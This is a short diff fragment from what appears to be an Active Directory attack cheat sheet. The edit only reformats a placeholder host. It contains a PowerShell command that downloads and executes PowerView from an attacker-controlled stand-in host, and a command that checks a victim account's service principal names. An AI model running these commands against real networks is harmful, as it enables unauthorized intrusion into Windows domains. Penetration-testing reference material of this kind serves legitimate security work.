@@ -16,7 +16,7 @@ Note: If clock error appears "KRB_AP_ERR_SKEW" use kerberos sync command before.
 
 #### From Windows (internally):
 
-Load powerview module first -> `IEX (new-object net.webclient).downloadstring('http://your_evil_ip_or_domain/powerview.ps1')`
+Load powerview module first -> `IEX (new-object net.webclient).downloadstring('http://<your_evil_ip_or_domain>/powerview.ps1')`
 
 Make sur that the target account has no SPN -> `Get-DomainUser '<victimuser>' | Select serviceprincipalname`
 
